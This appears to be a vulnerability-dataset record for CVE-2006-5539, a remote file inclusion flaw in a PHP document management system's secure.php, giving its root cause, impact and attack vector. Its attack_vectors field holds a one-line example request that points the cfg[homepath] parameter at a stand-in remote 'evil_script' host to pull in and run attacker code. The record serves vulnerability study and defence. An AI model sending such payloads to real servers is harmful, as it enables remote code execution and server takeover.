    "ID": "CVE-2006-5539",
    "source": "www.exploit-db.com_75a14ed4_20250124_182824.html",
    "vulnerability": "Remote File Inclusion",
    "description": "Ueber Project Document Management System (secure.php) is vulnerable to Remote File Inclusion. The vulnerability occurs due to insecure handling of the 'cfg[homepath]' parameter in the 'secure.php' script.",
    "root_cause": "The application directly includes a file path constructed from user-supplied data using the 'cfg[homepath]' parameter, without proper sanitization or validation. Specifically, the vulnerable code is in line 113 of secure.php: 'include($cfgRealProgDir . \"lng/\" . $languageFile);' where $cfgRealProgDir is derived from $cfg[homepath] which is user-controlled.",
    "weaknesses": [
      "Remote File Inclusion (RFI)",
      "Lack of input sanitization",
       "Use of user-controlled data in file path construction"
    ],
    "impact": "An attacker can include and execute arbitrary code from a remote server, leading to complete compromise of the web server, data theft, or other malicious activities.",
    "attack_vectors": "The attacker injects a malicious URL into the 'cfg[homepath]' parameter of the 'secure.php' script via a HTTP GET request. Example: 'http://www.hedef.com/[script_path]/login/secure.php?cfg[homepath]=http://evil_script?'",
    "attacker_capabilities": "The attacker only needs a web browser to send a crafted HTTP request. They do not need to be authenticated or have any special privileges."
